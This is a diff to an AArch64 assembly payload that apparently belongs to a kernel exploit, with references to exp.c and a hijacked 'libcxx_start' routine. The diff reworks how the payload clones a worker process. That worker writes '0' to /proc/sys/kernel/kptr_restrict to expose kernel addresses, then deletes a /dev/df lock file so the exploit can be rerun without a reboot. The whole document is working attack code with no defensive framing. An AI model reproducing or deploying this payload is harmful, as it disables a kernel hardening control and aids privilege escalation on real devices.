@@ -18,10 +18,6 @@ zero_str:
     .asciz "0"
     .balign 4
 
-    /* 
-     * 保留这个符号，虽然我们不再需要写 KO 了，
-     * 但为了防止 exp.c 里的相关代码（strncpy 等）编译报错，留一个空占位。
-     */
     .global libcxx_ko_target_off
 libcxx_ko_target_off:
     .int 0
@@ -60,21 +56,30 @@ libcxx_start:
     // return if fail to open (file exist)
     tbnz    w0, #31, return
 
-    // clone worker
+    sub     sp, sp, 16
+
+    // syscall(SYS_gettid);
+    mov     x8, SYS_gettid
+    svc     0
+    str     w0, [sp, 8]
+
+    // clone(CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD, 0, NULL, NULL, &ctid)
     mov     x8, SYS_clone
-    mov     x1, xzr              // stack
-    mov     x2, xzr              // ptid
-    mov     x3, xzr              // newtls
-    mov     x4, xzr              // ctid (不再需要)
+    add     x4, sp, 8           // ctid
+    mov     x3, xzr             // newtls
+    mov     x2, xzr             // ptid
+    mov     x1, xzr             // stack
     movl    x0, (CLONE_CHILD_SETTID | CLONE_CHILD_CLEARTID | SIGCHLD)
     svc     0
+    str     w0, [sp, 8]         // save id
+    add     sp, sp, 16
 
-    // parent returns to init
-    ret 
+    cbnz    w0, return          // parent returns to init safely
 
-// ── worker child ──────────────────────────────────────────────────────
-worker:
-    // openat(AT_FDCWD, "/proc/sys/kernel/kptr_restrict", O_WRONLY, 0)
+    // ── worker child ──────────────────────────────────────────────────────
+    sub     sp, sp, 32
+
+    // openat(AT_FDCWD, "/proc/sys/kernel/kptr_restrict", O_WRONLY|O_CLOEXEC, 0)
     mov     x0, -100
     adr     x1, kptr_file
     movl    x2, (O_WRONLY|O_CLOEXEC)
@@ -84,7 +89,7 @@ worker:
 
     // if (fd < 0) exit
     tbnz    w0, #31, myexit
-    mov     x19, x0              // save fd to x19
+    mov     x19, x0             // save fd to x19
 
     // write(fd, "0", 1)
     mov     x0, x19
@@ -98,14 +103,14 @@ worker:
     mov     x8, #SYS_close
     svc     0
 
-    // 顺便把 /dev/df 删了，这样你可以反复测试，不用每次重启
+    // unlinkat(AT_FDCWD, "/dev/df", 0)
     mov     x0, -100
     adr     x1, mutex_file
+    mov     x2, xzr
     mov     x8, #SYS_unlinkat
     svc     0
 
 myexit:
-    // exit(0)
     mov     x0, #0
     mov     x8, #SYS_exit
     svc     0
